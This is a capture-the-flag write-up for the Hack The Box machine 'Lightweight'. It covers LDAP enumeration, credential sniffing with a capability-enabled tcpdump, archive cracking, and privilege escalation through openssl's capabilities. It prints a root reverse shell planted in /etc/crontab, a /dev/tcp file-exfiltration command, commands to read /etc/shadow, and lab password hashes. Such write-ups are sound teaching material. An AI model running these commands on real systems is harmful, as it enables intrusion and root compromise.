@@ -1,0 +1,283 @@
+Lightweight
+
+27t h April 2019 / Document No D19.100.17
+
+Prepared By: MinatoTW
+Machine Author: 0xEA31
+Difficulty: Medium
+Classification: Official
+
+                                                                        Page 1 / 16
+SYNOPSIS
+
+Lightweight is a pretty unique and challenging box which showcases the common mistakes made
+by system administrators and the need for encryption in any kind protocol used. It deals with the
+abuse of Linux capabilities which can be harmful in bad hands and how unencrypted protocols
+like LDAP can be sniffed to gain information and credentials.
+
+Skills Required         Skills Learned
+
+     Linux Enumeration       Passive Sniffing
+     LDAP Enumeration        Abusing Linux Capabilities
+
+                                                         Page 2 / 16
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.119 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr ' \n' ',' | sed s/,$//)
+ nmap -p$ports -sC -sV 10.10.10.119
+
+LDAP ANONYMOUS BIND
+
+Enumerating LDAP by using anonymous bind. The base dn used will be "dc=lightweight,dc=htb"
+as reported by nmap scan. The results contain quite a number of objects consisting of usernames
+ldapuser1 and ldapuser2 along with their encrypted hashes.
+ ldapsearch -h 10.10.10.119 -x -b " dc=lightweight,dc=htb"
+The flag -h is used to specify the host, -x to specify anonymous bind and -b to mention the
+Basedn to use.
+
+                                                                                                                  Page 3 / 16
+root@Ubuntu:~/Documents/HTB/Lightweight# ldapsearch -h 10.10.10.119 -x -b
+"dc=lightweight,dc=htb"
+# extended LDIF
+#
+
+# LDAPv3
+
+# base <dc=lightweight,dc=htb> with scope subtree
+# filter: (objectclass=*)
+
+# requesting: ALL
+
+#
+
+# lightweight.htb
+
+dn: dc=lightweight,dc=htb
+objectClass: top
+
+objectClass: dcObject
+objectClass: organization
+o: lightweight htb
+
+dc: lightweight
+
+# Manager, lightweight.htb
+dn: cn=Manager,dc=lightweight,dc=htb
+objectClass: organizationalRole
+cn: Manager
+
+description: Directory Manager
+
+# People, lightweight.htb
+dn: ou=People,dc=lightweight,dc=htb
+
+                                      Page 4 / 16
+objectClass: organizationalUnit
+ou: People
+
+# Group, lightweight.htb
+dn: ou=Group,dc=lightweight,dc=htb
+objectClass: organizationalUnit
+ou: Group
+
+# ldapuser1, People, lightweight.htb
+dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
+uid: ldapuser1
+cn: ldapuser1
+sn: ldapuser1
+mail: ldapuser1@lightweight.htb
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: top
+objectClass: shadowAccount
+userPassword::
+e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
+oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vND
+Qv
+shadowLastChange: 17691
+shadowMin: 0
+shadowMax: 99999
+shadowWarning: 7
+loginShell: /bin/bash
+uidNumber: 1000
+gidNumber: 1000
+homeDirectory: /home/ldapuser1
+
+# ldapuser2, People, lightweight.htb
+dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+uid: ldapuser2
+cn: ldapuser2
+sn: ldapuser2
+mail: ldapuser2@lightweight.htb
+
+                                                                                                                Page 5 / 16
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: top
+objectClass: shadowAccount
+userPassword::
+e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
+zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z2
+4x
+shadowLastChange: 17691
+shadowMin: 0
+shadowMax: 99999
+shadowWarning: 7
+loginShell: /bin/bash
+uidNumber: 1001
+gidNumber: 1001
+homeDirectory: /home/ldapuser2
+
+# ldapuser1, Group, lightweight.htb
+dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: ldapuser1
+userPassword:: e2NyeXB0fXg=
+gidNumber: 1000
+
+# ldapuser2, Group, lightweight.htb
+dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: ldapuser2
+userPassword:: e2NyeXB0fXg=
+gidNumber: 1001
+
+# search result
+search: 2
+result: 0 Success
+
+                                                                                                                Page 6 / 16
+ # numResponses: 9
+ # numEntries: 8
+
+APACHE - PORT 80
+
+On port 80 there's a website which prevents bruteforcing so that we can't use tools like gobuster
+or dirbuster.
+
+The status tab lists the IP addresses blocked by the server and the user tab automatically adds a
+user on the box with username and password equal to our IP address.
+
+                                                                                                                  Page 7 / 16
+FOOTHOLD
+
+With the credentials provided it's possible to login to the box using ssh.
+ ssh 10.10.16.25@10.10.10.119
+ #password: 10.10.16.25
+
+This lands us into a low privilege shell restricted by SELinux.
+
+ENUMERATION
+
+After gaining a shell LinEnum.sh is executed with thorough mode enabled to enumerate the box.
+ cd /tmp
+ wget 10.10.16.25/LinEnum.sh
+ bash LinEnum.sh -t 1
+On running the script an unusual binary is seen with it's capability bit set. Linux capabilities is a
+feature which helps System Administrators to give a binary certain permissions which are needed
+to perform daily tasks without giving a user root permissions or making it a setuid binary. To read
+more refer to the manpage i.e "man capabilities" or visit this page -
+http://man7.org/linux/man-pages/man7/capabilities.7.html .
+
+The binary is tcpdump which is supposed to be run as root as it needs raw socket access.
+
+                                                                                                                  Page 8 / 16
+The binary tcpdump has cap_net_admin,cap_net_raw+ep capabilities enabled.
+ getcap /usr/sbin/tcpdump
+
+According to the man page cap_net_admin provides the ability to perform network related
+operations whereas cap_net_raw allows binding to ports and creating raw packets. The option
+ep stands "effective and permitted" using a + sign means adding the capability.
+
+This privilege can be abused by sniffing OpenLDAP traffic as it uses unencrypted connections in
+order to find credentials or information from bind requests.
+ tcpdump -i lo port 389 -w capture.cap -v
+The -i flag is used to specify the interface to sniff which is localhost in this case. We sniff on port
+389 and turn on verbose to see the captured packets. Let it run for 5 - 10 minutes and then
+transfer it over to inspect.
+
+                                                                                                                  Page 9 / 16
+It sniffed 11 packets valid for our filter. Transfer it and open it in wireshark.
+ scp 10.10.16.25@10.10.10.119:/tmp/capture.cap capture.cap
+ wireshark capture.cap
+It shows ldapuser2 making a bindRequest to localhost which succeeds.
+
+Right click on the packet > Follow > TCP Stream.
+
+Set the direction towards port 389. The password for ldapuser2 got captured in clear text as
+"8bc8251332abe1d7f105d3e53ad39ac2" as there was no encryption enabled.
+
+                                                                                                                 Page 10 / 16
+LATERAL MOVEMENT
+
+The password gained by sniffing can be used to su as ldapuser2.
+ su - ldapuser2
+
+CRACKING THE ZIP
+
+There's backup.7z in the folder which is transferred locally to examine.
+ cat backup.7z > /dev/tcp/10.10.16.25/4444
+ # On attacker box
+ nc -lvp 4444 > backup.7z
+
+                                                                                                                 Page 11 / 16
+On trying to extract the files it is found to be password protected. The password for ldapuser2
+doesn't work. So let's try to crack it using john and rockyou.txt.
+The program 7z2john.pl from John-the-ripper suite helps in creating a hash for the 7z archive.
+ cpan Compress::Raw::Lzma # Dependency
+ 7z2john.pl backup.7z > hash
+ john --format=7z --wordlist=rockyou.txt hash
+
+In a couple of minutes the password should be cracked and it's "delete". Extracting the contents
+results in few php files which are running on the server.
+ 7z x backup.7z # password : delete
+
+                                                                                                                 Page 12 / 16
+On examining the files, the file status.php contained the logic responsible for interacting with the
+LDAP server from which we obtain the password for ldapuser1.
+Now we can login as ldapuser1 with the password we just obtained.
+
+                                                                                                                 Page 13 / 16
+PRIVILEGE ESCALATION
+LINUX CAPABILITIES
+
+After logging in as ldapuser1 enumeration is done using LinEnum.sh or even manually. Listing the
+binaries with capabilities enabled fetches a new binary.
+
+We notice openssl apart from the others which we had found earlier. The capability set ep as
+discussed earlier stands for "effective and permitted" but there is no other capability attached to
+it. From the manpages,
+
+So by assigning empty capability to openssl it gets the permission to execute at uid 0.
+                                                                                                                 Page 14 / 16
+Lets try to read a privileged file using openssl like /etc/shadow.
+ ./openssl base64 -in /etc/shadow | base64 -d
+
+It can be seen that openssl was able to read the shadow file due to it's capabilities set even when
+we are a normal user.
+
+GETTING A SHELL AS ROOT
+
+Now that we can read and write to files, we can overwrite a sensitive file like /etc/crontab with a
+reverse shell to execute as root.
+ cd /tmp
+ cp /etc/crontab .
+ echo ' * * * * * root /bin/bash -i >& /dev/tcp/10.10.16.25/4444 0>&1' >>
+ crontab
+ base64 crontab > crontab.b64
+ /home/ldapuser1/openssl enc -d -base64 -in crontab.b64 -out /etc/crontab
+
+                                                                                                                 Page 15 / 16
+And as expected the /etc/crontab gets overwritten by our version.
+And a shell should be received within a minute.
+
+                                                                                                                 Page 16 / 16
+
